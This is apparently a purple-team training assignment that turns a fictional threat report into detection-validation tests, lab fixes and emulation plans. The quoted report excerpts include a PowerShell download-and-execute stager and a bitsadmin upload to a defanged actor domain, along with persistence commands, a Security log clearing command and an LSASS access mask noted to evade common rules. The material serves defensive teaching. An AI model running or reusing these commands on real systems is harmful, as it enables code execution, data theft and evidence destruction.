# Assignment 4 (Bonus): Adversary Emulation and Detection Validation

> **Level:** Senior CTI Analyst / Detection Engineer / Purple Team Lead
> **Estimated time:** 25–35 hours
> **Environment requirements:** Isolated lab environment (CTI Lab Docker Compose)
> **Deliverable language:** English

---

## ⚠️ Important Safety Warning

This assignment is **strictly limited to defensive and analytical contexts**.

**Permitted:**
- Analyzing public CTI reports for TTP extraction
- Designing safe emulation procedures in an isolated lab environment
- Using legitimate tools (CALDERA, Atomic Red Team, Invoke-Atomics) to simulate behavior
- Collecting telemetry and validating detection rules
- Documenting gaps and improvements

**Prohibited:**
- Using real exploits against real systems
- Creating or compiling malicious code
- Gaining unauthorized access to systems belonging to others
- Applying detection evasion techniques on production systems

All work is performed exclusively in an isolated lab environment.

---

## 1. Title and Objective

**Full title:** Adversary Emulation and Detection Validation: From CTI Report to Proven Detection Coverage

**Assignment objective:**

Take a provided CTI report, extract observable TTPs at the procedural level, design a safe emulation plan for the lab environment, collect telemetry, validate existing detections, and document gaps. The result is an evidence base for detection coverage and a concrete improvement backlog — delivered against a real organizational deadline.

---

## 2. Scenario

### 2.1 Organizational Context

You are the same CTI analyst who completed Assignments 1–3. The timeline has advanced by approximately six weeks.

**TechPay Israel Ltd.** (Assignment 3 context) is approaching its BoI-CD 362 Section 4 compliance deadline. CISO **Yael Mizrahi** has scheduled a board presentation in **three weeks** (21 days from today). The board wants empirical evidence that threat intelligence investments are translating into working detections — not just policy documents or vendor reports. Her exact requirement, communicated to you in writing:

> *"I need a Validation Report I can show the board that confirms our key detections fire against the TTPs we know are targeting us. Not 'we have a rule' — 'we tested the rule and it works.' That distinction is what the Bank of Israel Supervisor cares about under BoI-CD 362 Section 6."*

You also carry forward the findings from **LifeTech Pharma Ltd.** (Assignment 1). The Threat Actor Assessment you produced identified a suspected financially-motivated actor that:
- Used AiTM phishing for initial access
- Pivoted from cloud (M365) to on-premise via hybrid Azure AD join
- Used PowerShell for execution with base64 encoding and `-NonI -W Hidden` flags
- Deployed registry Run Key and scheduled task persistence
- Accessed LSASS and performed a DCSync operation
- Exfiltrated data over BITS jobs to an external host

At the time of Assignment 1, you wrote seven detection rules (DET-001 through DET-007). You now need to prove they work.

---

### 2.2 The CTI Report: "Operation Desert Cipher"

Three weeks ago, **Mandiant** published a detailed public report titled **"Operation Desert Cipher: Iranian-Nexus Intrusion Campaign Targeting Israeli Pharmaceutical and FinTech Sectors"** (fictional report — all details below are for training purposes).

The report describes a campaign active from **Q2 2024 through Q4 2024**, with confirmed victims in Israel, the UAE, and Cyprus. The victimology overlaps precisely with your portfolio organizations (Israeli pharma and fintech). The report presents:
- Attribution assessment: *"assessed with moderate confidence to be an Iranian-nexus intrusion cluster with dual financial and espionage motivation; partial TTP overlap with publicly-documented Iranian APT tradecraft; insufficient evidence for definitive attribution to a named group"*
- Detailed procedural TTPs with command-line strings, process ancestry chains, and network behavior
- Timeline of intrusion stages with approximate dwell times
- Indicators of Compromise (IOCs) with Admiralty reliability ratings

**Why this report is relevant to your PIRs:**
- **PIR-001** (TechPay Israel Ltd.): What TTPs are Iranian-nexus and financially-motivated actors using to target Israeli payment processors?
- **PIR-002** (LifeTech Pharma Ltd.): What methods are Iranian-nexus actors using to target R&D and licensing data in Israeli pharmaceutical companies?

The report directly answers both. Your task is to translate its procedural detail into testable emulation plans, run those plans in your lab, and produce the evidence Yael Mizrahi needs.

---

### 2.3 Selected Excerpts from "Operation Desert Cipher"

The following excerpts are the procedural sections of the report. These are the sections you must extract TTPs from. All technical details are fictional and designed for safe emulation at the procedure level.

---

**Report Section 3.1 — Initial Access (AiTM Phishing → Session Cookie Theft)**

> The actor delivered AiTM phishing lures via targeted email to finance and engineering personnel. Phishing domains were registered 1–3 days before use. Lure content impersonated Microsoft 365 MFA re-enrollment notifications.
>
> The phishing proxy harvested M365 session cookies directly. No credential re-entry was required. Post-harvest, the actor authenticated to the victim's M365 tenant using the session token, bypassing MFA entirely.
>
> **Analyst note:** Initial delivery mechanism (email lure) is assessed not to be directly emulatable. The post-harvest session token use is the procedurally-significant step. For detection purposes, the signal is: new M365 sign-in from an IP with no prior session history for that user, combined with token replay from a geographically anomalous location.

**Report Section 3.2 — Execution (PowerShell with Obfuscation)**

> Following M365 access, the actor used Microsoft Teams phishing (internal tenant messaging) to lure victim users to click on a SharePoint-hosted document. The document contained a malicious hyperlink to a VBScript dropper hosted at an actor-controlled domain.
>
> Upon VBScript execution, the first-stage payload launched PowerShell with the following observable pattern:
>
> ```
> wscript.exe → cmd.exe /c powershell.exe -NonI -W Hidden -Ep Bypass -Enc [base64-encoded stager]
> ```
>
> The base64-encoded command resolved to:
> ```powershell
> $u='hxxps://telemetry-cdn-services[.]biz/upd';$b=[System.Text.Encoding]::UTF8;
> $r=(New-Object Net.WebClient).DownloadString($u);
> iex($b.GetString([Convert]::FromBase64String($r)))
> ```
>
> Observable parent process chain: `wscript.exe` → `cmd.exe` → `powershell.exe -NonI -W Hidden -Enc`
>
> Sysmon observed CommandLine at time of execution: `-NonI -W Hidden -Ep Bypass -Enc [base64_string_variable_length_>100_chars]`

**Report Section 3.3 — Persistence (Registry Run Key and Scheduled Task)**

> The second-stage payload installed two persistence mechanisms.
>
> **Persistence Method 1 — Registry Run Key (HKCU):**
> ```
> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdateHelper" /t REG_SZ /d "C:\Users\[username]\AppData\Roaming\Microsoft\SysUpdate\svchost32.exe" /f
> ```
> *Analyst observation: The actor consistently used HKCU (not HKLM), likely to avoid requiring elevated privileges at this stage.*
>
> **Persistence Method 2 — Scheduled Task:**
> ```
> schtasks.exe /Create /SC DAILY /TN "\Microsoft\Windows\WDF\SysCheckUpdate" /TR "C:\Users\[username]\AppData\Roaming\Microsoft\SysUpdate\svchost32.exe" /ST 09:00 /F
> ```
> Both persistence mechanisms pointed to the same payload binary at the same path.

**Report Section 3.4 — Defense Evasion (PE Timestomping + Log Clearing)**

> The payload binary `svchost32.exe` carried a PE compile timestamp of **2018-04-09 04:14:22 UTC** across all observed samples. This timestamp is identical to the one observed in the LifeTech Pharma incident analysis (see: cross-cluster indicator IND-042 in this report).
>
> Approximately 2 hours after persistence installation, the actor cleared Windows Security event logs:
> ```
> wevtutil.exe cl Security
> ```
> Sysmon EID 1 observed: `wevtutil.exe cl Security`, ParentImage: `cmd.exe`, User: `[compromised domain user]`

**Report Section 3.5 — Credential Access (LSASS + DCSync)**

> The actor performed LSASS memory access from a compromised endpoint. The Sysmon-observable parameters:
>
> - Source process: a renamed copy of `taskmgr.exe` placed at `C:\Windows\Temp\svchost32.exe`
> - Target process: `lsass.exe`
> - GrantedAccess: **`0x1410`** (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE)
>
> *Critical detection note: The actor used GrantedAccess mask `0x1410` — not the commonly-detected `0x1010`. Several EDR products and Sysmon rules tuned for `0x1010` will miss this.*
>
> Subsequently, from a compromised Domain Admin account on the domain controller, the actor triggered a DCSync operation:
>
> **Observable indicator:** Windows Security EID 4662 on the DC:
> - `Object Type: {19195a5b-6da0-11d0-afd3-00c04fd930c9}` (domainDNS)
> - `Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes)
> - `Access Mask: 0x100`
> - `Account Name: [domain_admin]`

**Report Section 3.6 — Lateral Movement (WMI Remote Execution)**

> The actor executed commands on a remote host via WMI:
> ```
> wmic /node:[target_IP] process call create "powershell.exe -NonI -W Hidden -Enc [base64]"
> ```
>
> On the target host, process ancestry observed by Sysmon:
> ```
> WmiPrvSE.exe (parent) → powershell.exe -NonI -W Hidden -Enc [base64] (child)
> ```
> Target host: `SERVER-RD-02` (secondary R&D server).

**Report Section 3.7 — Collection and Exfiltration (BITS + Cloud Storage)**

> Prior to exfiltration, the actor staged data at `C:\Windows\Temp\~tmp[8-char-random]\`.
>
> Exfiltration was conducted in two stages:
>
> **Stage 1 — BITS download as test/probe:**
> ```
> bitsadmin.exe /transfer "WindowsUpdate" /download /priority normal hxxps://198.51.100.44/config.dat C:\Windows\Temp\config.dat
> ```
>
> **Stage 2 — Data upload via BITS (less common, weaponized):**
> ```
> bitsadmin.exe /transfer "TelemetryUpload" /upload /priority normal hxxps://telemetry-cdn-services[.]biz/upload C:\Windows\Temp\~tmp8a3f2b19\archive.zip
> ```
>
> *Detection note: BITS upload via bitsadmin to external non-Microsoft destinations is rare in legitimate enterprise environments and should be treated as high-confidence malicious activity.*

**Report Section 3.8 — C2 Beaconing**

> The C2 implant beaconed over HTTPS to actor-controlled infrastructure at **~180-second intervals with ±45-second jitter**. All C2 traffic used valid TLS certificates (Let's Encrypt). The User-Agent string was a spoofed Windows Update client string: `Microsoft-CryptoAPI/10.0`.
>
> Beaconing persisted for the full dwell time (average 23 days observed across victims). No DNS-over-HTTPS or domain fronting was observed in this campaign.

---

### 2.4 Lab State: Complicating Factors

When you sit down to begin emulation, you discover several pre-existing conditions in your lab environment that complicate the work. These are not hypothetical — your lab has been in use since Assignments 1 and 2, and accumulated technical debt.

---

**Complication 1: DET-002 Is About to Be Disabled**

Three days ago, the Detection Engineering lead **Sarah Chen** (from Assignment 3's TechPay Israel Ltd. context) sent you this Slack message:

> *"Hey — DET-002 (PowerShell Encoded Command) is generating 47 alerts per day in production. I traced it to our PowerShell DSC automation and some scripts from the CyberArk PAM suite. I'm going to disable it Friday unless I hear from you with a tuning plan. We can't have the SOC drowning in noise. The rule is worse than useless right now."*

**DET-002** is exactly one of the rules you need to validate for the board presentation. If it gets disabled before your validation is complete, you lose the empirical result. You need to:
1. Investigate the FP sources before Friday (you have 2 days)
2. Propose a tuning fix that reduces FPs while retaining detection of the actor's specific procedure
3. Re-run the emulation test against the tuned rule before the board presentation

The actor-specific procedure from the report uses the parent chain `wscript.exe → cmd.exe → powershell.exe -Enc`. The FP sources (CyberArk and DSC) launch PowerShell from `SYSTEM` context with a parent of `services.exe` or `wmiprvse.exe` — not from `wscript.exe` or `cmd.exe` as an interactive user.

This means a parent-process condition can separate actor behavior from legitimate automation. You must document this analysis and provide Sarah with the updated rule logic before Friday.

---

**Complication 2: Sysmon HKCU Registry Gap**

When you attempt to validate the Registry Run Key persistence (HKCU path from the report's Section 3.3), you discover that your Sysmon configuration does not log `HKCU` registry changes. The SwiftOnSecurity Sysmon configuration deployed in the lab monitors `HKLM` Run key paths but has no include filter for `HKCU`.

This is precisely the gap the threat actor exploited — and it's why HKCU is favored (the report notes this explicitly). Your current DET-004 rule targeting `HKCU\...\CurrentVersion\Run` would **never fire** on a real intrusion because the telemetry doesn't exist.

You must:
1. Document the gap (Sysmon EID 13 is not generated for HKCU paths with current config)
2. Update the Sysmon configuration XML to include the required HKCU registry path
3. Restart Sysmon and verify the fix
4. Re-run the emulation test to confirm the gap is closed
5. Calculate how long this gap has existed and what the detection blind window was

---

**Complication 3: DC01 Winlogbeat Is Not Sending EID 4662**

The DCSync detection (DET-005) relies on Windows Security EID 4662 from the Domain Controller. Your lab's second VM (the Windows Server 2019 DC) has a Winlogbeat configuration that was deployed three months ago and has never been audited.

When you check Kibana, you find:
- EID 4624 (logon events) from DC01 → present in Elasticsearch ✓
- EID 4688 (process creation) from DC01 → present in Elasticsearch ✓
- **EID 4662 (object access) from DC01 → absent from Elasticsearch ✗**

Investigation reveals that the Winlogbeat config on DC01 uses a `fields` filter that includes Security events `4624, 4625, 4634, 4648, 4688, 4698` — but **not 4662**. EID 4662 requires Active Directory auditing to be enabled (via GPO: `Audit Directory Service Access`) and the Winlogbeat channel list to include it.

Additionally, even if Winlogbeat is fixed, the `Audit Directory Service Access` policy on DC01 shows `No Auditing` — meaning the event would not be generated by Windows at all, regardless of Winlogbeat.

Two separate configuration failures must be identified and fixed before DCSync detection can be validated.

---

**Complication 4: LSASS GrantedAccess Mask Mismatch**

The "Operation Desert Cipher" report specifies that the actor used GrantedAccess `0x1410` for LSASS access — not the commonly-expected `0x1010` that most Atomic Red Team tests use by default.

Your existing DET (from Assignment 1) targets the condition:
```
Sysmon EID 10 AND TargetImage CONTAINS "lsass.exe" AND GrantedAccess IN ("0x1010", "0x1fffff")
```

The access mask `0x1410` is not in this list. Running `Invoke-AtomicTest T1003.001 -TestNumbers 2` (which uses `0x1010` by default) will generate a True Positive — but **it is testing a different procedure than the one in the report**.

To properly validate detection coverage against the reported actor behavior, you must either:
- Modify the Atomic test to use `0x1410` specifically, or
- Use an alternative test method that issues the precise GrantedAccess mask from the report

You must document:
1. That the default Atomic test passes (TP for `0x1010`)
2. That the actor-specific procedure (`0x1410`) is a False Negative with the current rule
3. The updated detection logic that covers both masks
4. Re-test with the actor-specific mask to confirm the fix

---

**Complication 5: WMI Lateral Movement Requires 2-VM Configuration**

The report's Section 3.6 describes WMI lateral movement: the actor ran `wmic /node:[target_IP]` from the compromised workstation to execute code on a remote server. Validating this requires:
- **VM1** (LAB-WIN10-01): the source host running the wmic command
- **VM2** (LAB-DC01): the target host receiving the WMI call

Your second VM is the Domain Controller, and the emulation must run the WMI command from a **domain user account** with permissions to remotely execute via WMI on the DC. When you attempt this, you discover:
- The domain user `lab\testuser` does not have permissions for remote WMI execution on LAB-DC01
- DCOM settings on LAB-DC01 deny remote activation from non-admin accounts
- Windows Firewall on LAB-DC01 blocks the WMI traffic from the workstation subnet

This is a lab configuration gap that must be resolved before WMI lateral movement can be emulated. Documenting the resolution process is part of the assignment — it reflects a real-world challenge where lab environments are never perfectly pre-configured.

**Fallback approach:** If the 2-VM WMI configuration cannot be fixed within time constraints, document the gap, simulate WMI lateral movement locally (via `wmic process call create` on the same host), and explicitly note that local WMI execution was tested as a fallback and that remote execution telemetry was not validated.

---

**Complication 6: Three-Week Board Presentation Deadline**

All of the above complications must be resolved, and the full validation must be completed, within **three weeks**. Yael Mizrahi has indicated she will not request an extension from the board. The Validation Report (D12) must be delivered to her by **Day 19** at the latest (allowing two days for review and slide preparation).

Your prioritization is constrained by this deadline. You must triage which gaps are worth fixing and re-testing versus which gaps should be documented as accepted risk with a remediation timeline. Not everything can be fixed in three weeks — and a mature Validation Report acknowledges this explicitly rather than pretending all issues will be resolved before the presentation.

**Mandatory judgment call:** Identify which three findings are the highest risk to TechPay Israel Ltd.'s threat profile (based on PIR-001 relevance) and argue why those three should be fixed before the board presentation. Everything else goes into the post-presentation backlog.

---

### 2.5 Pre-Existing Detection State

The following detections from Assignments 1–2 are currently deployed in your lab Elastic SIEM. Their state at the start of this assignment:

| Rule ID | Name | Source Assignment | Current Status | Known Issue |
|---|---|---|---|---|
| DET-001 | Office → PowerShell child process | Assignment 1 | Active | Severity set to "Medium" by DE; you requested "High" |
| DET-002 | PowerShell Encoded Command | Assignment 1 | Active (under threat of disable) | 47 FPs/day from CyberArk + DSC automation |
| DET-003 | WmiPrvSE → PowerShell | Assignment 1 | Active | No known issues |
| DET-004 | Scheduled Task Creation via schtasks.exe | Assignment 1 | Active | No known issues |
| DET-005 | DCSync Indicator (EID 4662) | Assignment 1 | **Not functioning** | Winlogbeat misconfiguration + missing audit policy |
| DET-006 | BITS External Download (non-Microsoft) | Assignment 1 | Active | Only covers download; upload variant uncovered |
| DET-007 | Security Log Cleared (wevtutil cl) | Assignment 1 | Active | No known issues |
| DET-008 | HKCU Run Key Persistence | Assignment 2 | **Not functioning** | Sysmon HKCU gap — EID 13 never generated for HKCU |
| DET-009 | LSASS Memory Access (EID 10) | Assignment 2 | Active | GrantedAccess filter: `0x1010` and `0x1fffff` only; misses `0x1410` |

---

### 2.6 What the Board Presentation Requires

Yael Mizrahi has been explicit about what she needs to show the board. She prepared a slide template with the following table that you must populate with validation results:

| BoI-CD 362 Section | Detection | TTP Covered | Validation Status | Evidence Reference |
|---|---|---|---|---|
| §6 (threat-based scenarios) | DET-002 | T1059.001 PowerShell execution | [to be filled] | [Validation report section] |
| §6 | DET-003 | T1021.003 WMI lateral movement | [to be filled] | [Validation report section] |
| §6 | DET-005 | T1003.006 DCSync | [to be filled] | [Validation report section] |
| §4 (threat intelligence) | Coverage Matrix | Full TTP coverage assessment | [to be filled] | [Coverage Matrix D9] |
| §8 (TLPT) | Improvement Backlog | Gaps with remediation plan | [to be filled] | [Backlog D11] |

If a detection is marked "Validated — TP confirmed" in the Validation Report, it can be listed as "COMPLIANT" in the board presentation. If it is listed as "FN identified — remediation in progress," it must be listed as "PARTIAL — remediation tracked" with a timeline.

A gap with no plan cannot appear in the board presentation at all — Yael Mizrahi's instruction: *"If we can't say what we're doing about it, we don't mention it. The Bank of Israel Supervisor reads these slides."*

---

### 2.7 Summary of Scenario Complexity

The scenario you are operating in has the following dimensions:

| Dimension | Detail |
|---|---|
| **Primary pressure** | BoI-CD 362 Section 4/11 board presentation in 3 weeks |
| **CTI source** | "Operation Desert Cipher" — procedure-level detail, Israeli pharma/fintech targeting |
| **Key mismatch #1** | LSASS GrantedAccess `0x1410` vs rule that only covers `0x1010` |
| **Key mismatch #2** | HKCU registry persistence with no Sysmon telemetry |
| **Key mismatch #3** | DCSync detection non-functional (Winlogbeat + audit policy) |
| **Political pressure** | DET-002 FP storm — risk of disable before validation |
| **Lab constraints** | WMI lateral movement requires 2-VM config not fully set up |
| **Analytical judgment** | Must triage which gaps to fix vs accept within 3-week window |
| **Deliverable constraint** | Board slide table has specific columns that map to validation report sections |

---

## 3. Learning Objectives

1. Extract procedure-level TTPs from a CTI report — at the command-string level, not just technique names
2. Distinguish between tactic, technique, and procedure (TTP hierarchy) — and understand why the procedural level determines detection fidelity
3. Identify procedure-level mismatches between published IOCs and existing detection logic (e.g., GrantedAccess mask variants)
4. Design a safe emulation plan — what can be emulated, what can only be simulated, what requires lab reconfiguration
5. Diagnose and remediate detection infrastructure gaps (Sysmon config, Winlogbeat filter, audit policy)
6. Conduct systematic detection validation: True Positive / False Negative / No Data / False Positive classification
7. Perform root cause analysis on every False Negative — not "the rule didn't fire" but specifically why
8. Build a Coverage Matrix from emulation results and map it to organizational threat priorities (PIR alignment)
9. Triage a findings backlog under time constraints and argue prioritization decisions
10. Produce board-presentable detection validation evidence that satisfies regulatory requirements (BoI-CD 362 Section 4, 11, 26)

---

## 4. TTP Extraction

### 4.1 Selection: "Operation Desert Cipher" — Pre-Selected for This Scenario

For this assignment, the CTI report has been pre-selected: the fictional **"Operation Desert Cipher"** report by Mandiant (excerpts provided in Section 2.3).

**Justification (which you must reproduce in D1):**
- **Relevance to TechPay Israel Ltd. (PIR-001):** The campaign targets Israeli fintech verticals with the same TTPs observed in the LifeTech Pharma incident — AiTM phishing, LSASS credential access, and DCSync. Israeli payment sector targeting is explicit in the report's victimology.
- **Relevance to PIR-002:** Israeli pharmaceutical targeting is documented in the campaign.
- **TTP detail level:** Procedure-level commands are provided for 8 of 9 stages (see Section 2.3 excerpts). One stage (Initial Access — AiTM) is assessed as simulation-only.
- **Temporal relevance:** Campaign active Q2–Q4 2024 — within 3 years.
- **Cross-report overlap:** The PE timestamp `2018-04-09 04:14:22 UTC` cross-references the LifeTech Pharma incident analysis from Assignment 1, reinforcing the same Iranian-nexus cluster assessment.

**Note:** If you prefer to substitute a real publicly-available report, the selection criteria remain the same. Any substitution must include a written justification explaining why it is more relevant than "Operation Desert Cipher" to your PIRs.

### 4.2 TTP Extraction Table

Complete the table for **each technique** from the "Operation Desert Cipher" report:

| TTP ID | Tactic | ATT&CK Technique | Procedure (from report) | Source in Report | Confidence | Emulatable in Lab? | Actor-Specific Detail for Detection |
|---|---|---|---|---|---|---|---|
| E001 | Initial Access | T1557 AiTM / T1566.001 Spearphishing | AiTM proxy → M365 session cookie harvest | Section 3.1 | High | Simulation only (emulate post-harvest step) | New M365 sign-in from anomalous IP + token replay |
| E002 | Execution | T1059.001 PowerShell | `wscript.exe → cmd.exe → powershell.exe -NonI -W Hidden -Ep Bypass -Enc [base64>100 chars]` | Section 3.2 | High | Yes (manual procedure) | Parent chain: wscript.exe → cmd.exe → powershell; Ep Bypass flag; Enc base64 >100 chars |
| E003 | Persistence | T1547.001 Registry Run Key | `reg add "HKCU\...\Run" /v "SysUpdateHelper"` | Section 3.3 | High | Yes — after Sysmon fix | HKCU (not HKLM); path includes `AppData\Roaming\Microsoft\SysUpdate\` |
| E004 | Persistence | T1053.005 Scheduled Task | `schtasks.exe /Create /SC DAILY /TN "\Microsoft\Windows\WDF\SysCheckUpdate"` | Section 3.3 | High | Yes | Task name masquerades as WDF Windows component namespace |
| E005 | Defense Evasion | T1070.001 Log Clearing | `wevtutil.exe cl Security` | Section 3.4 | High | Yes | wevtutil with 'cl' and 'Security' argument |
| E006 | Defense Evasion | T1070.006 Timestomping | PE compile timestamp `2018-04-09` on `svchost32.exe` | Section 3.4 | Medium | Static analysis only | Timestamp predates binary deployment by 6+ years |
| E007 | Credential Access | T1003.001 LSASS Memory | GrantedAccess **`0x1410`** from renamed taskmgr.exe | Section 3.5 | High | Yes — with custom Atomic test | GrantedAccess `0x1410` specifically; source binary is renamed copy |
| E008 | Credential Access | T1003.006 DCSync | EID 4662: DS-Replication-Get-Changes from domain admin account | Section 3.5 | High | Yes — after Winlogbeat + audit policy fix | EID 4662 on DC; property `1131f6aa`; Access Mask `0x100` |
| E009 | Lateral Movement | T1047 WMI | `wmic /node:[target] process call create "powershell.exe -NonI -W Hidden -Enc"` | Section 3.6 | High | Yes — after 2-VM config fix | Parent chain on target: WmiPrvSE.exe → powershell.exe |
| E010 | Exfiltration | T1197 BITS Jobs | `bitsadmin.exe /transfer ... /upload ... hxxps://telemetry-cdn-services[.]biz/upload` | Section 3.7 | High | Yes | BITS **upload** (not download) to non-Microsoft external host |
| E011 | C2 | T1071.001 HTTPS Beaconing | HTTPS to C2; ~180s interval ±45s jitter; UA: `Microsoft-CryptoAPI/10.0` | Section 3.8 | Medium | Simulation (periodic local HTTP requests) | User-Agent spoofing; jitter ±45s |

**Minimum 10 techniques documented — this table contains 11.**

### 4.3 Emulability Assessment

| TTP ID | Status | Rationale |
|---|---|---|
| E001 | **Simulate Only** | AiTM infrastructure requires a live phishing proxy; cloud tenant session injection cannot be safely lab-replicated. Simulate post-harvest step: manual M365 token replay in lab tenant only. |
| E002 | **Fully Emulatable** | wscript.exe → cmd.exe → powershell.exe -Enc chain is reproducible with a benign base64-encoded payload (e.g., `Write-Host "Atomic Test"`). No network connectivity required. |
| E003 | **Fully Emulatable after fix** | Requires Sysmon HKCU registry monitoring fix first. After fix, `reg add HKCU\...\Run` is directly emulatable. |
| E004 | **Fully Emulatable** | schtasks.exe with documented parameters is directly emulatable. Cleanup required after test. |
| E005 | **Fully Emulatable** | wevtutil cl Security is directly emulatable. **Warning:** This will clear Security logs on the test VM — take a snapshot first and record the exact timestamp. |
| E006 | **Static Analysis Only** | PE timestomping cannot be safely emulated without creating a modified binary. Use static analysis of a benign PE with a manually-forged timestamp to validate the forensic detection methodology. |
| E007 | **Fully Emulatable with modification** | Default Atomic T1003.001 uses `0x1010`. Must modify or use alternative test for `0x1410`. No credential extraction — handle-open telemetry only. |
| E008 | **Fully Emulatable after fix** | Requires Winlogbeat EID 4662 fix AND `Audit Directory Service Access` GPO on DC01. After fix, use `Invoke-AtomicTest T1003.006`. |
| E009 | **Fully Emulatable after 2-VM config** | Requires DCOM permission fix on DC01 and domain user WMI permissions. Fallback: local WMI execution if remote config cannot be fixed. |
| E010 | **Fully Emulatable** | `bitsadmin /transfer /upload` to a local Python HTTP server (no external connectivity). Must test upload variant specifically — download variant already covered by DET-006. |
| E011 | **Simulate Only** | Real C2 infrastructure not emulatable. Simulate with a PowerShell loop making periodic HTTP requests to a local Python server with random sleep jitter. |

---

## 5. Lab Architecture

### 5.1 Required Configuration for This Assignment

```
┌──────────────────────────────────────────────────────────────────────┐
│                    Isolated Lab Network (192.168.99.0/24)             │
│                                                                        │
│  ┌───────────────────────┐    ┌─────────────────────────────────────┐  │
│  │  LAB-WIN10-01         │    │  LAB-DC01                           │  │
│  │  Windows 10/11 Ent.   │    │  Windows Server 2019 (AD DS)        │  │
│  │  (Primary test target)│    │  (DC + lateral movement target)     │  │
│  │                       │    │                                     │  │
│  │  Sysmon v15+          │    │  Sysmon v15+                        │  │
│  │  SwiftOnSecurity cfg  │    │  SwiftOnSecurity cfg                │  │
│  │  + HKCU fix applied   │    │                                     │  │
│  │                       │    │  Winlogbeat config MUST include:    │  │
│  │  Winlogbeat →         │    │  - Security channel with EID 4662   │  │
│  │  Elasticsearch        │    │  Audit DS Access GPO: enabled       │  │
│  └───────────────────────┘    └─────────────────────────────────────┘  │
│                                                                        │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │  LAB-UBUNTU-01 (Python HTTP server for BITS/beacon simulation)    │  │
│  │  python3 -m http.server 8080 (listens for upload/download tests)  │  │
│  └───────────────────────────────────────────────────────────────────┘  │
│                                                                        │
│  ┌───────────────────────────────────────────────────────────────────┐  │
│  │  CTI Lab Docker Stack (Elasticsearch + Kibana SIEM)               │  │
│  │  DET-001 through DET-009 loaded                                   │  │
│  │  Baseline: 2 hours of normal activity before any emulation        │  │
│  └───────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────┘
```

**Critical pre-conditions to verify before emulation:**

- [ ] Sysmon EID 13 generates for `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` (after config fix)
- [ ] Winlogbeat on LAB-DC01 is sending EID 4662 to Elasticsearch
- [ ] `Audit Directory Service Access` is enabled via GPO on LAB-DC01
- [ ] Domain user `lab\testuser` has WMI remote execution permissions on LAB-DC01
- [ ] BITS upload test server is running on LAB-UBUNTU-01 (or local equivalent)
- [ ] DET-002 tuning proposal submitted to Sarah Chen and updated rule deployed

### 5.2 Infrastructure Fixes Required Before Emulation

**Fix 1: Sysmon HKCU Registry Monitoring**

Add the following to the Sysmon configuration XML under `<RegistryEvent onmatch="include">`:

```xml
<!-- HKCU Run Key — actor persistence via HKCU (no admin required) -->
<TargetObject condition="contains">
    \Software\Microsoft\Windows\CurrentVersion\Run
</TargetObject>
<TargetObject condition="contains">
    \Software\Microsoft\Windows\CurrentVersion\RunOnce
</TargetObject>
```

Reload: `sysmon64.exe -c sysmonconfig.xml`
Verify: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$_.Id -eq 13} | Select-Object -First 5`

---

**Fix 2: Winlogbeat EID 4662 and Audit Policy on LAB-DC01**

Step 1 — Enable DS Access auditing (run on LAB-DC01 as Domain Admin):
```powershell
# Enable Audit Directory Service Access
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
# Verify
auditpol /get /subcategory:"Directory Service Access"
```

Step 2 — Update Winlogbeat configuration on LAB-DC01 (`winlogbeat.yml`):
```yaml
winlogbeat.event_logs:
  - name: Security
    event_id: 4624, 4625, 4634, 4648, 4662, 4688, 4698, 4720, 4732, 4768
```

Step 3 — Restart Winlogbeat: `Restart-Service winlogbeat`

Step 4 — Verify: Query Kibana for `event.code: 4662 AND host.name: LAB-DC01` — should show at least SYSTEM-initiated directory access events within 5 minutes of restart.

---

**Fix 3: WMI Remote Execution Permissions on LAB-DC01**

```powershell
# On LAB-DC01 as Domain Admin — grant lab\testuser remote WMI access
$computers = "LAB-DC01"
$user = "lab\testuser"

# Add to WMI namespace permissions
$namespace = "root\cimv2"
$sd = Invoke-WmiMethod -Namespace $namespace -Path "__SystemSecurity" -Name "GetSD"
# [Detailed DCOM permission configuration — student must document steps taken]

# Alternative: Add lab\testuser to local "Distributed COM Users" group on LAB-DC01
Add-LocalGroupMember -Group "Distributed COM Users" -Member $user

# Verify Windows Firewall allows WMI from workstation subnet
netsh advfirewall firewall add rule name="WMI-Lab-Allow" `
    dir=in action=allow protocol=tcp localport=135 `
    remoteip=192.168.99.0/24
```

### 5.3 Pre-Emulation Checklist

Before starting emulation:

- [ ] All lab VMs isolated from the internet
- [ ] VM snapshots taken on all hosts (before any emulation)
- [ ] All 3 infrastructure fixes applied and verified (Sysmon HKCU, Winlogbeat EID 4662, WMI DCOM)
- [ ] DET-002 updated rule deployed to Kibana (tuned version — not disabled)
- [ ] Kibana alert queue cleared (no stale alerts from prior sessions)
- [ ] Baseline of normal activity collected (minimum 2 hours) and documented
- [ ] Python HTTP server running on LAB-UBUNTU-01 (port 8080, logging enabled)
- [ ] Test execution log opened with initial timestamp
- [ ] Sysmon configuration version documented in execution log header

---

## 6. Emulation Plan

### 6.1 Emulation Procedure Template and Examples

---

**EP-001: PowerShell Execution with Encoding and Specific Parent Chain (T1059.001 + T1027)**

| Field | Value |
|---|---|
| TTP Reference | E002 |
| ATT&CK IDs | T1059.001, T1027 |
| Actor-Specific Procedure | `wscript.exe → cmd.exe → powershell.exe -NonI -W Hidden -Ep Bypass -Enc [base64>100]` |
| Objective | Validate DET-002 (tuned rule) — confirm TP for actor parent chain; confirm FP reduction for CyberArk/DSC |
| Safe Payload | `Write-Host "Operation Desert Cipher Atomic Test EP-001" ; Start-Sleep 2` |
| Base64 Encode | `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Write-Host "EP-001 Atomic" ; Start-Sleep 2'))` |
| Emulation Command | Create test.vbs: `Set sh = CreateObject("WScript.Shell") : sh.Run "cmd /c powershell.exe -NonI -W Hidden -Ep Bypass -Enc " & [base64], 0, True` |
| Run | `cscript.exe C:\temp\test.vbs` |
| Atomic Red Team | `Invoke-AtomicTest T1059.001 -TestNumbers 1` — but does not reproduce exact parent chain; manual method preferred |
| Expected Detection | DET-002 fires on: `powershell.exe -Enc` with ParentImage `cmd.exe` AND GrandParentImage `cscript.exe` |
| Expected Log | Sysmon EID 1: CommandLine contains `-Enc`; ParentImage = `cmd.exe`; base64 length >100 chars |
